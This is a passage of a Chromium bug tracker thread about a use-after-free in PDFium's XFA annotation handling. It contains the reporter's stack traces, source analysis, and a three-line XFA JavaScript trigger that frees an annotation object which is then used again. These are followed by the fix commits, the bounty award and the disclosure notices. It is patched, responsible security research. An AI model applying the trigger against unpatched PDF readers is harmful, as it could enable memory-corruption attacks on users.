2c 008fd648 13100f1d chrome!chrome_pdf::PDFiumEngine::HandleEvent(class pp::InputEvent * event = 0x008fd7b8)+0x249 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\pdfium\pdfium_engine.cc @ 962] 
2d 008fd7cc 1189ebf6 chrome!chrome_pdf::OutOfProcessInstance::HandleInputEvent(class pp::InputEvent * event = 0x008fd7fc)+0x60d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\pdf\out_of_process_instance.cc @ 846] 
2e 008fd80c 0ab0a767 chrome!pp::InputEvent_HandleEvent(int pp_instance = 0n1767439529, int resource = 0n966)+0x96 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\ppapi\cpp\module.cc @ 53] 
...
```
We can see clearly that the JS code is executed when program tries to resolve SOM expression with function `CFXJSE_Engine::ResolveObjects`

Now we understand that how JS code is executed. Back to function `CPDFSDK_AnnotHandlerMgr::GetNextAnnot`
```
    // For xfa annots in XFA pages not backed by PDF pages.
    std::unique_ptr<IXFA_WidgetIterator> pWidgetIterator(
        pPage->GetXFAPageView()->CreateWidgetIterator(
            XFA_TRAVERSEWAY_Tranvalse, XFA_WidgetStatus_Visible |
                                           XFA_WidgetStatus_Viewable |
                                           XFA_WidgetStatus_Focused));
    if (!pWidgetIterator)
      return nullptr;
    if (pWidgetIterator->GetCurrentWidget() != pSDKAnnot->GetXFAWidget())
      pWidgetIterator->SetCurrentWidget(pSDKAnnot->GetXFAWidget());
    CXFA_FFWidget* hNextFocus = bNext ? pWidgetIterator->MoveToNext()
                                      : pWidgetIterator->MoveToPrevious();
```
JS code callback is called when function `CreateWidgetIterator` is called. If we set JS code in `ref` attribute like 
below
```
xfa.host.setFocus(field_DropDownList1);
xfa.template.remerge();
xfa.host.openList(field_DropDownList1);
```
We can delete `CPDFSDK_Annot` object (variable `pSDKAnnot`). And after JS callback, program is used `CPDFSDK_Annot` 
object again with instruction `if (pWidgetIterator->GetCurrentWidget() != pSDKAnnot->GetXFAWidget())`. We can see 
stacktrace when `CPDFSDK_Annot` object is freed (using PageHeap command in windbg)
```
2:033> !heap -p -a ecx
    address 4756cfe0 found in
    _DPH_HEAP_ROOT @ a381000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                   473034e0:         4756c000             2000
    6e1fad92 verifier!AVrfDebugPageHeapFree+0x000000c2
    770eb609 ntdll!RtlDebugFreeHeap+0x0000003e
    77093452 ntdll!RtlpFreeHeap+0x0004dff2
    770450c1 ntdll!RtlFreeHeap+0x00000201
    66e7e017 ucrtbased!_free_base+0x00000027 [minkernel\crts\ucrt\src\appcrt\heap\free_base.cpp @ 105]
    66e7b251 ucrtbased!free_dbg_nolock+0x00000471 [minkernel\crts\ucrt\src\appcrt\heap\debug_heap.cpp @ 1001]
    66e7d9ec ucrtbased!_free_dbg+0x0000007c [minkernel\crts\ucrt\src\appcrt\heap\debug_heap.cpp @ 1030]
    77d86d0e pdfium!operator delete+0x0000000e [f:\dd\vctools\crt\vcstartup\src\heap\delete_scalar.cpp @ 34]
    7771628c pdfium!CPDFSDK_XFAWidget::~CPDFSDK_XFAWidget+0x0000003c [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_xfawidget.cpp @ 19]
    776b7191 pdfium!std::__1::default_delete<CPDFSDK_Annot>::operator()+0x00000031 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\buildtools\third_party\libc++\trunk\include\memory @ 2338]
    776b7107 pdfium!std::__1::unique_ptr<CPDFSDK_Annot,std::__1::default_delete<CPDFSDK_Annot> >::reset+0x00000057 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\buildtools\third_party\libc++\trunk\include\memory @ 2651]
    776b555d pdfium!std::__1::unique_ptr<CPDFSDK_Annot,std::__1::default_delete<CPDFSDK_Annot> >::~unique_ptr+0x0000001d [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\buildtools\third_party\libc++\trunk\include\memory @ 2605]
    777166fa pdfium!CPDFSDK_XFAWidgetHandler::ReleaseAnnot+0x0000004a [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_xfawidgethandler.cpp @ 253]
    776b5423 pdfium!CPDFSDK_AnnotHandlerMgr::ReleaseAnnot+0x00000073 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_annothandlermgr.cpp @ 66]
    776d5fa9 pdfium!CPDFSDK_PageView::DeleteAnnot+0x00000129 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\cpdfsdk_pageview.cpp @ 183]
    7786136f pdfium!CPDFXFA_DocEnvironment::WidgetPreRemove+0x0000010f [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\fpdfsdk\fpdfxfa\cpdfxfa_docenvironment.cpp @ 345]
    77889128 pdfium!CXFA_FFNotify::OnLayoutItemRemoving+0x00000098 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\cxfa_ffnotify.cpp @ 491]
    77d0b304 pdfium!XFA_ReleaseLayoutItem+0x00000084 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\layout\cxfa_layoutitem.cpp @ 28]
    77d0b2b9 pdfium!XFA_ReleaseLayoutItem+0x00000039 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\layout\cxfa_layoutitem.cpp @ 23]
    77d0b2b9 pdfium!XFA_ReleaseLayoutItem+0x00000039 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\layout\cxfa_layoutitem.cpp @ 23]
    77d0b2b9 pdfium!XFA_ReleaseLayoutItem+0x00000039 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\layout\cxfa_layoutitem.cpp @ 23]
    77d0b2b9 pdfium!XFA_ReleaseLayoutItem+0x00000039 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\layout\cxfa_layoutitem.cpp @ 23]
    77d0b2b9 pdfium!XFA_ReleaseLayoutItem+0x00000039 [C:\Users\huyna_dev\Desktop\chromium\chromium_pdfium_XFA\src\third_party\pdfium\xfa\fxfa\layout\cxfa_layoutitem.cpp @ 23]
...
```

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-07-25)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/6e3a40600f246bd8cff2367e3805ce53466cb349

commit 6e3a40600f246bd8cff2367e3805ce53466cb349
Author: huyna <huyna89@gmail.com>
Date: Thu Jul 25 20:41:23 2019

Prevent an UAF in CPDFSDK_AnnotHandlerMgr::GetNextAnnot().

Calling CXFA_FFPageView::CreateWidgetIterator() can trigger JS and
invalidate CPDFSDK_Annot objects. Use ObservedPtr to check for
CPDFSDK_Annot destruction to catch this.

Bug: chromium:980161
Change-Id: Ifdb926be75c129d7b4a05c3b1fb8c747ef352e71
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/58171
Reviewed-by: Tom Sepez <tsepez@chromium.org>
Commit-Queue: Tom Sepez <tsepez@chromium.org>

[modify] https://pdfium.googlesource.com/pdfium/+/6e3a40600f246bd8cff2367e3805ce53466cb349/fpdfsdk/cpdfsdk_annothandlermgr.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/6e3a40600f246bd8cff2367e3805ce53466cb349/AUTHORS


### ts...@chromium.org (2019-07-25)

[Empty comment from Monorail migration]

### ts...@chromium.org (2019-07-25)

Thanks for the patch, huyna.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-07-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/29fde33cf86319334eeef60b2efc1650a22d60a2

commit 29fde33cf86319334eeef60b2efc1650a22d60a2
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Fri Jul 26 01:39:04 2019

Roll src/third_party/pdfium 7734ba9a7d52..6e3a40600f24 (1 commits)

https://pdfium.googlesource.com/pdfium.git/+log/7734ba9a7d52..6e3a40600f24


git log 7734ba9a7d52..6e3a40600f24 --date=short --no-merges --format='%ad %ae %s'
2019-07-25 huyna89@gmail.com Prevent an UAF in CPDFSDK_AnnotHandlerMgr::GetNextAnnot().


Created with:
  gclient setdep -r src/third_party/pdfium@6e3a40600f24

The AutoRoll server is located here: https://autoroll.skia.org/r/pdfium-autoroll

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

If the roll is causing failures, please contact the current sheriff, who should
be CC'd on the roll, and stop the roller if necessary.



TBR=pdfium-deps-rolls@chromium.org

Bug: chromium:980161
Change-Id: I6b4280fe452ede9c487828d99a8430b52582207f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1717463
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#681117}

[modify] https://crrev.com/29fde33cf86319334eeef60b2efc1650a22d60a2/DEPS


### sh...@chromium.org (2019-07-26)

[Empty comment from Monorail migration]

### hu...@gmail.com (2019-07-26)

No problem, @tsepez. It's great to get the first accepted patch with this project. Thanks for your help a lot! 

### na...@google.com (2019-07-30)

[Empty comment from Monorail migration]

### na...@google.com (2019-08-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-08-01)

Congrats! The Panel decided to reward you $5,500 for this report! 

### na...@google.com (2019-08-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-11-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-02)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/ceb66ad5c4c3fc2767a8de899112e1ea0e6e498d

commit ceb66ad5c4c3fc2767a8de899112e1ea0e6e498d
Author: Lei Zhang <thestig@chromium.org>
Date: Tue Jun 02 00:54:19 2020

Fix an UnownedPtr error in CXFA_FFTabOrderPageWidgetIterator.

CPDFXFA_Page::GetNextXFAAnnot() and GetFirstOrLastXFAAnnot() can
potentially trigger an UnownedPtr error in
CXFA_FFTabOrderPageWidgetIterator. Fix the issue by using a RetainPtr to
ensure the object in question has the right live time.

This is a secondary issue from a previous bug report. Add a test case
for that.

Bug: chromium:980161
Change-Id: I895c3b6634aa0f7a68d2b44cc0307afc64716c78
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/70252
Reviewed-by: Tom Sepez <tsepez@chromium.org>
Commit-Queue: Lei Zhang <thestig@chromium.org>

[add] https://pdfium.googlesource.com/pdfium/+/ceb66ad5c4c3fc2767a8de899112e1ea0e6e498d/testing/resources/javascript/xfa_specific/bug_980161.in
[modify] https://pdfium.googlesource.com/pdfium/+/ceb66ad5c4c3fc2767a8de899112e1ea0e6e498d/xfa/fxfa/cxfa_ffpageview.h
[modify] https://pdfium.googlesource.com/pdfium/+/ceb66ad5c4c3fc2767a8de899112e1ea0e6e498d/xfa/fxfa/cxfa_ffpageview.cpp
[add] https://pdfium.googlesource.com/pdfium/+/ceb66ad5c4c3fc2767a8de899112e1ea0e6e498d/testing/resources/javascript/xfa_specific/bug_980161.evt


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-06-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f1f98eec2c1b3650c99f4992f076e1135a39a9e1

commit f1f98eec2c1b3650c99f4992f076e1135a39a9e1
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Tue Jun 02 03:15:10 2020

Roll PDFium from f32ae562fe52 to 634973155ab5 (13 revisions)

https://pdfium.googlesource.com/pdfium.git/+log/f32ae562fe52..634973155ab5

2020-06-02 thestig@chromium.org Use more RetainPtrs in CXFA_FFTabOrderPageWidgetIterator.
2020-06-02 thestig@chromium.org Clean up CXFA_FFTabOrderPageWidgetIterator.
2020-06-02 thestig@chromium.org Fix an UnownedPtr error in CXFA_FFTabOrderPageWidgetIterator.
2020-06-02 thestig@chromium.org Mass rewrite dtors to use "= default".
2020-06-02 thestig@chromium.org Remove unused CXFA_FFPageWidgetIterator members.
2020-06-02 thestig@chromium.org Remove DeviceType::kUnknown.
2020-06-01 nigi@chromium.org Update comments and add an embeddertest for FPDF_LCD_TEXT.
2020-06-01 thestig@chromium.org Mark CFX_RenderDevice::SetDeviceDriver() as protected.
2020-06-01 thestig@chromium.org Mark CFX_RenderDevice ctor as protected.
2020-06-01 thestig@chromium.org Make CPDFXFA_Page annot iteration methods more consistent.
2020-06-01 pdfium-autoroll@skia-public.iam.gserviceaccount.com Roll Code Coverage from a8f20a1dacc2 to a70177d4a2e5 (3 revisions)
2020-06-01 pdfium-autoroll@skia-public.iam.gserviceaccount.com Roll Catapult from 31b81b84c957 to 91fa1462a88f (119 revisions)
2020-05-29 nigi@chromium.org Remove repetitive |FXTEXT_CLEARTYPE| usages in fxbarcode/oned/.

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/pdfium-autoroll
Please CC pdfium-deps-rolls@chromium.org on the revert to ensure that a human
is aware of the problem.

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+doc/master/autoroll/README.md

Bug: chromium:980116,chromium:980161
Tbr: pdfium-deps-rolls@chromium.org
Change-Id: Ie371134e4b5618bb5dbef9d2fd0ae33d76e4bae6
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2226041
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#773986}

[modify] https://crrev.com/f1f98eec2c1b3650c99f4992f076e1135a39a9e1/DEPS


### is...@google.com (2020-06-02)

This issue was migrated from crbug.com/chromium/980161?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095553)*
